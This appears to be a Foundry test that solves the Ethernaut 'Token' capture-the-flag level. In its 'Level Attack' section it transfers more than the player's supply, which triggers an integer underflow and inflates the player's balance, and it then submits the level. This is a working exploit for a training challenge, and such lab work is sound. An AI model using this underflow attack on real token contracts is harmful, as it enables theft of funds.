// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/05-Token/TokenFactory.sol";
import "../src/Ethernaut.sol";

contract TokenTest is Test {
    Ethernaut ethernaut;
    address playerAddress = address(6529);
    address toAddress = address(9256);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(playerAddress, 1 ether);
    }

    function testToken() public {
        // Level Setup
        TokenFactory tokenFactory = new TokenFactory();
        ethernaut.registerLevel(tokenFactory);
        vm.startPrank(playerAddress);
        address levelAddress = ethernaut.createLevelInstance(tokenFactory);
        Token ethernautToken = Token(payable(levelAddress));

        // Level Attack
        emit log_named_uint("Balance before transfer", ethernautToken.balanceOf(playerAddress));
        ethernautToken.transfer(toAddress, tokenFactory.PLAYER_SUPPLY() + 10);
        emit log_named_uint("Balance after transfer", ethernautToken.balanceOf(playerAddress));

        // Level Submission
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress)); 
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}